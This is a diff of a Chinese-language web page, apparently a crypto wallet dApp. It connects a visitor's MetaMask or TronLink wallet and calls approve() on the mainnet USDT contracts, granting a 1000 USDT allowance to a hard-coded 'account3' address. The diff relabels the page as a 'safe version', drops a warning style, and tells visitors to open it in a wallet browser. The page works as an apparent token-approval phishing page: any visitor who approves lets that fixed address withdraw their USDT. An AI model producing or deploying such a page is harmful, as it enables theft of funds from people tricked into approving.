@@ -2,7 +2,7 @@
 <html lang="zh">
 <head>
   <meta charset="UTF-8" />
-  <title>跨链授权：USDT（MetaMask & TronLink）</title>
+  <title>跨链授权 USDT（DApp 安全版）</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -36,11 +36,6 @@
       background: #e8f5e8;
       border-left: 4px solid #4CAF50;
     }
-    .warning {
-      background: #fff8e1;
-      border-left: 4px solid #ff9800;
-      color: #e65100;
-    }
     .error {
       color: red;
       background: #ffebee;
@@ -51,39 +46,33 @@
 </head>
 <body>
   <div class="container">
-    <h2>🔐 USDT</h2>
-    <p>支持 MetaMask（ETH-USDT）和 TronLink（TRON-USDT）</p>
+    <h2>🔐 跨链授权 USDT</h2>
+    <p>支持 MetaMask（ETH）和 TronLink（TRON）</p>
 
     <button id="connect">连接钱包</button>
     <div id="accountInfo"></div>
     <div id="chainInfo"></div>
-    <!-- 移除了 ownerCheck 区域（USDT 无 owner） -->
-
     <button id="approve" disabled>授权 1000 USDT 给 Account 3</button>
     <div id="result"></div>
   </div>
 
-  <!-- 引入 SDK -->
-  <!-- <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.1.0/dist/TronWeb.min.js"></script> -->
-  <script src="ethers.umd.min.js"></script>
-  <script src="TronWeb.min.js"></script>
+  <!-- 只引入 ethers.js（用于 parseUnits 等工具函数） -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
   <script>
     // ===================
-    // 配置：USDT 跨链地址（官方）
+    // 配置（请按需修改 account3）
     // ===================
     const CONFIG = {
       ethereum: {
         token: "0xdac17f958d2ee523a2206206994597c13d831ec7", // ETH-USDT
-        account3: "0x7d9a039c1b59b29e7c6a41aa4889c8db8e0b672d", // ← 替换为你的 ETH 接收地址
-        decimals: 6,
-        chainId: 1
+        account3: "0x7d9a039c1b59b29e7c6a41aa4889c8db8e0b672d", // ← 替换为你的 ETH 地址
+        decimals: 6
       },
       tron: {
         token: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // TRON-USDT
-        account3: "TENBpGLoxcAsUQvUrN36xpDKPYmadpc1x3", // TRON 接收地址
-        decimals: 6,
-        chainId: "mainnet"
+        account3: "TENBpGLoxcAsUQvUrN36xpDKPYmadpc1x3", // TRON 地址
+        decimals: 6
       }
     };
 
@@ -91,33 +80,60 @@
     let signerOrTronWeb = null;
 
     // ===================
-    // 连接钱包
+    // 工具：等待钱包注入完成
+    // ===================
+    function waitForProvider(providerName, timeout = 3000) {
+      return new Promise((resolve) => {
+        if (window[providerName]) {
+          resolve(window[providerName]);
+          return;
+        }
+        const start = Date.now();
+        const check = setInterval(() => {
+          if (window[providerName]) {
+            clearInterval(check);
+            resolve(window[providerName]);
+          } else if (Date.now() - start > timeout) {
+            clearInterval(check);
+            resolve(null);
+          }
+        }, 100);
+      });
+    }
+
+    // ===================
+    // 连接钱包（用户点击触发）
     // ===================
     document.getElementById("connect").onclick = async () => {
       const resultDiv = document.getElementById("result");
       resultDiv.innerHTML = "";
 
-      if (typeof window.tronWeb !== 'undefined') {
+      // 1. 等待 TronLink
+      const tronWeb = await waitForProvider('tronWeb');
+      if (tronWeb && tronWeb.ready) {
         currentChain = 'tron';
-        // 确保 TronWeb 完全注入
-        if (!window.tronWeb.ready) {
-          resultDiv.innerHTML = `<div class="error">请等待 TronLink 完全加载</div>`;
-          return;
-        }
+        signerOrTronWeb = tronWeb;
         await handleTronConnect();
-      } else if (typeof window.ethereum !== 'undefined') {
+        return;
+      }
+
+      // 2. 等待 MetaMask
+      const ethereum = await waitForProvider('ethereum');
+      if (ethereum) {
         currentChain = 'ethereum';
         try {
-          const provider = new ethers.providers.Web3Provider(window.ethereum);
+          const provider = new ethers.providers.Web3Provider(ethereum);
           await provider.send("eth_requestAccounts", []);
           signerOrTronWeb = provider.getSigner();
           await handleEthConnect();
+          return;
         } catch (err) {
-          resultDiv.innerHTML = `<div class="error">MetaMask 连接被拒绝</div>`;
+          resultDiv.innerHTML = `<div class="error">MetaMask 授权被拒绝</div>`;
+          return;
         }
-      } else {
-        resultDiv.innerHTML = `<div class="error">请安装 MetaMask 或 TronLink 钱包</div>`;
       }
+
+      resultDiv.innerHTML = `<div class="error">未检测到钱包。请在 TronLink 或 MetaMask 中打开此页面。</div>`;
     };
 
     async function handleEthConnect() {
@@ -125,7 +141,6 @@
         const addr = await signerOrTronWeb.getAddress();
         document.getElementById("accountInfo").innerHTML = `<div class="info">✅ ETH 账户：${addr}</div>`;
         document.getElementById("chainInfo").innerHTML = `<div class="info">🌐 网络：Ethereum</div>`;
-        // USDT 无 owner，直接启用按钮
         document.getElementById("approve").disabled = false;
         document.getElementById("result").innerHTML = `<div class="info">✅ 已连接，可授权 USDT</div>`;
       } catch (err) {
@@ -135,26 +150,22 @@
 
     async function handleTronConnect() {
       try {
-        // ✅ 官方推荐：主动请求账户
-        const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
+        // ✅ 主动请求账户（TronLink 官方要求）
+        const accounts = await signerOrTronWeb.request({ method: 'tron_requestAccounts' });
         const addr = accounts[0];
-
-        // 更新全局 tronWeb 实例（确保最新）
-        signerOrTronWeb = window.tronWeb;
 
         document.getElementById("accountInfo").innerHTML = `<div class="info">✅ TRON 账户：${addr}</div>`;
         document.getElementById("chainInfo").innerHTML = `<div class="info">🌐 网络：TRON</div>`;
-        // USDT 无 owner，直接启用按钮
         document.getElementById("approve").disabled = false;
         document.getElementById("result").innerHTML = `<div class="info">✅ 已连接，可授权 USDT</div>`;
       } catch (err) {
         console.error("TronLink 请求失败", err);
-        document.getElementById("result").innerHTML = `<div class="error">❌ 请授权 TronLink 账户</div>`;
+        document.getElementById("result").innerHTML = `<div class="error">❌ 请授权 TronLink 账户访问</div>`;
       }
     }
 
     // ===================
-    // 授权操作（安全处理）
+    // 授权操作
     // ===================
     document.getElementById("approve").onclick = async () => {
       const cfg = CONFIG[currentChain];
@@ -172,7 +183,7 @@
           tx = await contract.approve(cfg.account3, amount);
           await tx.wait();
         } else {
-          // TRON: 安全金额处理
+          // TRON: 使用 ethers 处理精度，再转字符串
           const amount = ethers.utils.parseUnits(amountStr, cfg.decimals).toString();
           const contract = await signerOrTronWeb.contract().at(cfg.token);
           tx = await contract.approve(cfg.account3, amount).send({
@@ -180,11 +191,11 @@
           });
         }
 
-        document.getElementById("result").innerHTML = `<div class="info">✅ 授权成功！<br>交易 ID: ${tx}</div>`;
+        document.getElementById("result").innerHTML = `<div class="info">✅ 授权成功！<br>交易 ID: ${tx.transaction ? tx.transaction : tx}</div>`;
       } catch (err) {
         console.error("授权失败", err);
         let msg = err.reason || err.message || String(err);
-        if (msg.includes("user denied")) {
+        if (msg.includes("user denied") || msg.includes("User denied")) {
           msg = "用户取消了交易";
         }
         document.getElementById("result").innerHTML = `<div class="error">❌ 授权失败：<br>${msg}</div>`;
